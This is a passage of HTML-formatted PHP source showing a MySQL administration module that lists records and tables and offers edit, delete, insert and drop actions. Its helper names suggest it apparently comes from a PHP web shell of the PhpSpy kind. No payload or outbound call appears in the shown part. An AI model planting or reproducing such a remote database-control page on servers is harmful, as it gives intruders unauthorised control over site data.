<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($mn as $key=&gt;$inside){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $b1 .= '&lt;td nowrap&gt;'.html_clean($ins<span style="text-decoration: underline;">ide).'&amp;nbsp;&lt;/td&gt;';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where = base64_encode($where);

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($allowedit) p('&lt;td nowrap&gt;&lt;a href="j<span style="text-decoration: underline;">avascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;');</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($b1);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   unset($b1);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fieldnum = @mysql_num_fields($result);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   for($i=0;$i&lt;$fieldnum;$i++){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $name = @mysql_field_name($result, $i);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $type = @mysql_field_type($result, $i);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $len = @mysql_field_len($result, $i);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)<span style="text-decoration: underline;">".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   tbfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($multipage);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   break;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   case 2:
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $ar = mysql_affected_rows();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;affected rows : &lt;b&gt;'.$ar.'&lt;/b&gt;&lt;/h2&gt;')<span style="text-decoration: underline;">;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   break;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $query = q("SHOW TABLE STATUS");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $table_num = $table_rows = $data_size = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledb = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while($table = mysql_fetch_array($query)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $data_size = $data_size + $table['Data_length'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $table_rows = $table_rows + $table['Rows'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $table['Data_length'] = sizecount($table['Data_length']);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $table_num++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledb[] = $table;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $data_size = sizecount($data_size);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   unset($table);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;table border="0" cellpadding="0" cellspacing="0"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form action="'.$self.'" method="POST"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($dbform);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Name&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Rows&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Data_length&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Create_time&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Update_time&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($highver) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Engine&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Operate&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($tabledb as $key =&gt; $table) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'foc<span style="text-decoration: underline;">us\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name<span style="text-decoration: underline;">="table[]" value="'.$table['Name'].'" /&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\');<span style="text-decoration: underline;">"&gt;'.$table['Name'].'&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table['Rows'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table['Data_length'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table['Create_time'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table['Update_time'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($highver) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table['Engine'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table['Collation'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\', <span style="text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
